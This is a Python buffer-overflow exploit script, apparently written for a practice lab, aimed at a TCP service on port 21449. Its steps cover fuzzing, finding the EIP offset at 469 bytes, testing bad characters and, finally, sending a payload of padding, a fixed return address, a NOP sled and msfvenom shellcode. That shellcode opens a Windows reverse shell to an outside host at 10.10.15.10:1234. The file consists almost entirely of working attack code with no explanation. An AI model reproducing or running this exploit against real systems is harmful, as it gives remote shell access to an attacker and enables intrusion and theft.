#!/usr/bin/python3

import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def fuzz():
    try:
        for i in range(0,500,100):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

#fuzz()

def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq", "utf-8")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

#eip_offset()

def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

#eip_control()

def bad_chars():
    all_chars = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0B, 0x0C, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
        0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
        0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
        0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
        0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
        0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
        0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
        0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
        0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
        0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
        0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

#bad_chars()

def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python' -b '\x00,\x0A,\x0D'
    buf =  b""
    buf += b"\xbb\xbb\x1d\x8b\xb7\xd9\xce\xd9\x74\x24\xf4\x5e\x31"
    buf += b"\xc9\xb1\x52\x31\x5e\x12\x03\x5e\x12\x83\x7d\x19\x69"
    buf += b"\x42\x7d\xca\xef\xad\x7d\x0b\x90\x24\x98\x3a\x90\x53"
    buf += b"\xe9\x6d\x20\x17\xbf\x81\xcb\x75\x2b\x11\xb9\x51\x5c"
    buf += b"\x92\x74\x84\x53\x23\x24\xf4\xf2\xa7\x37\x29\xd4\x96"
    buf += b"\xf7\x3c\x15\xde\xea\xcd\x47\xb7\x61\x63\x77\xbc\x3c"
    buf += b"\xb8\xfc\x8e\xd1\xb8\xe1\x47\xd3\xe9\xb4\xdc\x8a\x29"
    buf += b"\x37\x30\xa7\x63\x2f\x55\x82\x3a\xc4\xad\x78\xbd\x0c"
    buf += b"\xfc\x81\x12\x71\x30\x70\x6a\xb6\xf7\x6b\x19\xce\x0b"
    buf += b"\x11\x1a\x15\x71\xcd\xaf\x8d\xd1\x86\x08\x69\xe3\x4b"
    buf += b"\xce\xfa\xef\x20\x84\xa4\xf3\xb7\x49\xdf\x08\x33\x6c"
    buf += b"\x0f\x99\x07\x4b\x8b\xc1\xdc\xf2\x8a\xaf\xb3\x0b\xcc"
    buf += b"\x0f\x6b\xae\x87\xa2\x78\xc3\xca\xaa\x4d\xee\xf4\x2a"
    buf += b"\xda\x79\x87\x18\x45\xd2\x0f\x11\x0e\xfc\xc8\x56\x25"
    buf += b"\xb8\x46\xa9\xc6\xb9\x4f\x6e\x92\xe9\xe7\x47\x9b\x61"
    buf += b"\xf7\x68\x4e\x25\xa7\xc6\x21\x86\x17\xa7\x91\x6e\x7d"
    buf += b"\x28\xcd\x8f\x7e\xe2\x66\x25\x85\x65\x83\xb0\x8b\x32"
    buf += b"\xfb\xc6\x93\xb8\x29\x4f\x75\xaa\xdd\x06\x2e\x43\x47"
    buf += b"\x03\xa4\xf2\x88\x99\xc1\x35\x02\x2e\x36\xfb\xe3\x5b"
    buf += b"\x24\x6c\x04\x16\x16\x3b\x1b\x8c\x3e\xa7\x8e\x4b\xbe"
    buf += b"\xae\xb2\xc3\xe9\xe7\x05\x1a\x7f\x1a\x3f\xb4\x9d\xe7"
    buf += b"\xd9\xff\x25\x3c\x1a\x01\xa4\xb1\x26\x25\xb6\x0f\xa6"
    buf += b"\x61\xe2\xdf\xf1\x3f\x5c\xa6\xab\xf1\x36\x70\x07\x58"
    buf += b"\xde\x05\x6b\x5b\x98\x09\xa6\x2d\x44\xbb\x1f\x68\x7b"
    buf += b"\x74\xc8\x7c\x04\x68\x68\x82\xdf\x28\x98\xc9\x7d\x18"
    buf += b"\x31\x94\x14\x18\x5c\x27\xc3\x5f\x59\xa4\xe1\x1f\x9e"
    buf += b"\xb4\x80\x1a\xda\x72\x79\x57\x73\x17\x7d\xc4\x74\x32"

    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3) 
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
